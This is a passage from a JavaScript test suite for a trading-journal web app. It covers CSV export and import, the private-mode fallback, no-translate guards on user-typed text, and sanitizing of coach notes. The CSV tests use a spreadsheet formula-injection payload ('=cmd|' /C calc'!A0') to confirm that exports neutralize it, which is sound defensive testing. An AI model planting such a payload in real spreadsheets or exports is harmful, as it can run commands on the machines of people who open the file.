  assert.strictEqual(rows.find(r => r.symbol === 'MSFT').notes, "'@mention and\ttab");
  assert.ok(csv.includes('"\'=cmd|\' /C calc\'!A0"'), 'guarded cells are quoted');
  J.reset();
  assert.strictEqual(J.importJSON(csv).added, 2);
  const back = J.get(e.id);
  assert.strictEqual(back.notes, evil, 'round trip restores the original text');
  assert.strictEqual(back.setup, "=cmd|' /C calc'!A0");
  assert.strictEqual(back.lessons, '-50 was my stop, then +20');
  assert.strictEqual(back.pnl, -12.5);
  // exporting the same journal again is stable (no doubled quotes)
  assert.strictEqual(J.exportCSV().split('\r\n').length, csv.split('\r\n').length);
  assert.strictEqual(J.parseCSV(J.exportCSV()).find(r => r.symbol === 'AAPL').notes, "'" + evil);
});

test('exportCSV() of a filtered list exports only those rows', () => {
  fresh(); seedPaper(); J.sync();
  const csv = J.exportCSV(J.entries({ account: 'replay' }));
  assert.strictEqual(csv.split('\r\n').length, 2);
  assert.ok(csv.includes('SPY'));
});

/* ---------------- robustness --------------------------------------- */
test('works without localStorage (private mode): in-memory only, no throw', () => {
  const saved = window.localStorage;
  window.localStorage = null;
  try {
    J.reset();
    const e = J.add({ symbol: 'X', pnl: 1 });
    assert.ok(e && J.entries().length === 1);
    assert.strictEqual(J.save(), false);
    assert.ok(J.sync());
  } finally { window.localStorage = saved; fresh(); }
});

/* ---------------- journal.html: user-authored text is never machine-translated --------- */
test('journal.html renders user-typed text (setup/notes/lessons/tags/account) inside no-i18n guards', () => {
  const fs = require('fs');
  const html = fs.readFileSync(path.join(__dirname, '..', 'journal.html'), 'utf8');
  // Re-create entryCard() from the page with stubbed helpers and check every user value is guarded.
  const src = html.match(/var UT = [\s\S]*?\n  function renderEntries/);
  assert.ok(src, 'entryCard block found');
  const esc = s => String(s).replace(/[&<>"]/g, c => ({ '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;' }[c]));
  const emotionOf = () => null, stars = () => '', fillText = () => 'Bought 1 @ $1', niceDate = d => d, isNum = () => false, cls = () => '', signed = x => x;
  void esc; void emotionOf; void stars; void fillText; void niceDate; void isNum; void cls; void signed;
  // eslint-disable-next-line no-eval
  const entryCard = eval('(function () {' + src[0].replace(/\n  function renderEntries$/, '') + '; return entryCard; })()');
  const out = entryCard({ id: '1', symbol: 'Dashboard', account: 'Portfolio', setup: 'Buy', notes: 'Sell', lessons: 'Close', tags: ['Dashboard', 'Portfolio'], emotion: 'Hold', confidence: 3, rating: 3, date: '2026-11-13' });
  ['Buy', 'Sell', 'Close', 'Hold', 'Dashboard', 'Portfolio'].forEach(w => {
    const hits = [...out.matchAll(new RegExp('<(span|div)([^>]*)>' + w + '</', 'g'))];
    assert.ok(hits.length, w + ' rendered');
    hits.forEach(h => assert.ok(/no-i18n/.test(h[2]) && /translate="no"/.test(h[2]), w + ' is guarded: ' + h[0]));
  });
  // Filter <option>s built from raw values, breakdown row labels and tag chips carry the guard too.
  assert.ok(/var guard = labelFn \? '' : ' class="no-i18n" translate="no"'/.test(html), 'fillSelect guards raw values');
  assert.ok(/<td class="no-i18n" translate="no" title="' \+ esc\(r\.label\)/.test(html), 'breakdown label cell guarded');
  assert.ok(/b\.className = 'chip on no-i18n'; b\.setAttribute\('translate', 'no'\)/.test(html), 'editor tag chip guarded');
  assert.ok(/class="chip sug sm no-i18n" translate="no"/.test(html), 'suggested tag chip guarded');
});

test('coach notes: normalizeEntry keeps a sanitized coach field; update/sync preserve it; null clears it', () => {
  fresh();
  const long = 'x'.repeat(5000);
  const raw = { symbol: 'AAPL', notes: 'n', coach: { at: 123, ai: long, findings: [
    { id: 'noStop', level: 'warn', title: 'No stop', message: 'Plan a stop.', lessonId: 'm4-l2', extra: 'drop me' },
    { id: 'rr', level: 'weird', title: 'Low R:R', message: 'm', lessonId: '<script>' },
    'junk', null, { level: 'tip' }
  ].concat(Array.from({ length: 20 }, (_, i) => ({ id: 'f' + i, title: 't' + i }))) } };
  const e = J.add(raw);
  assert.ok(e.coach, 'coach kept');
  assert.strictEqual(e.coach.at, 123);
  assert.strictEqual(e.coach.ai.length, 2000, 'ai capped at 2000 chars');
  assert.strictEqual(e.coach.findings.length, 10, 'at most 10 findings');
  assert.deepStrictEqual(e.coach.findings[0], { id: 'noStop', level: 'warn', title: 'No stop', message: 'Plan a stop.', lessonId: 'm4-l2' });
  assert.strictEqual(e.coach.findings[1].level, 'tip', 'unknown level becomes tip');
  assert.strictEqual(e.coach.findings[1].lessonId, null, 'unsafe lesson id dropped');
  // survives a patch that does not mention coach, a reload and an export/import round trip
  const u = J.update(e.id, { notes: 'changed' });
  assert.strictEqual(u.coach.findings[0].id, 'noStop');
  J.load();
  assert.strictEqual(J.get(e.id).coach.findings.length, 10, 'persisted');
  const dump = J.exportJSON();
  J.reset(); J.importJSON(dump);
  assert.strictEqual(J.get(e.id).coach.findings[0].title, 'No stop', 'import keeps coach');
  // explicit null clears; empty coach is dropped
  assert.strictEqual(J.update(e.id, { coach: null }).coach, undefined);
  assert.strictEqual(J.normalizeCoach({ findings: [] }), null);
  assert.strictEqual(J.add({ symbol: 'X', coach: 'nope' }).coach, undefined);
});

test('coach notes: setCoach finds the synced entry for a paper fill and keeps an earlier AI note', () => {
  fresh(); seedPaper();
  P.use('main');
  const trades = P.getState().trades;
  const closeFill = trades[trades.length - 1];               // MSFT close
  // no sync yet: setCoach syncs once so the fill gets its entry
  const notes = { at: fakeNow, findings: [{ id: 'stopSlip', level: 'warn', title: 'Bigger loss than planned', message: 'm', lessonId: 'm4-l2' }] };
  const e1 = J.setCoach({ trade: closeFill, account: 'main' }, notes);
  assert.ok(e1, 'entry found');
  assert.strictEqual(e1.symbol, 'MSFT');
  assert.strictEqual(e1.trade.role, 'close');
  assert.strictEqual(e1.coach.findings[0].id, 'stopSlip');
  assert.strictEqual(J.findByTrade(closeFill, 'main').id, e1.id);
  assert.strictEqual(J.findByTrade(closeFill, 'replay'), null, 'account filter respected');
  // the student's edits and the coach notes survive a re-sync
  J.update(e1.id, { setup: 'Breakout' });
  J.sync(P);
  assert.strictEqual(J.get(e1.id).coach.findings[0].id, 'stopSlip');
  assert.strictEqual(J.get(e1.id).setup, 'Breakout');
  // AI note added, then a rules-only refresh keeps it unless keepAi:false
  J.setCoach(e1.id, { findings: notes.findings, ai: 'Your stop was further than planned.' });
  assert.strictEqual(J.get(e1.id).coach.ai, 'Your stop was further than planned.');
  J.setCoach(e1, [{ id: 'size', level: 'tip', title: 'Big position', message: 'm' }]);
  assert.strictEqual(J.get(e1.id).coach.findings[0].id, 'size', 'bare findings array accepted');
  assert.strictEqual(J.get(e1.id).coach.ai, 'Your stop was further than planned.', 'AI note kept');
  J.setCoach(e1.id, { findings: notes.findings }, { keepAi: false });
  assert.strictEqual(J.get(e1.id).coach.ai, undefined);
  // lookups by tradeId string and unknown refs
  assert.strictEqual(J.setCoach(e1.tradeId, notes).id, e1.id);
  assert.strictEqual(J.setCoach('nope', notes), null);
  assert.strictEqual(J.setCoach({ trade: { id: 999 }, account: 'main' }, notes), null);
  // coachView adds lesson links (fallback URL without BT.coach)
  const v = J.coachView(J.get(e1.id));
  assert.strictEqual(v[0].lessonUrl, 'learn.html#/lesson/m4-l2');
  assert.deepStrictEqual(J.coachView({}), []);
});

console.log('\n' + passed + ' passed, ' + failed + ' failed');
process.exit(failed ? 1 : 0);
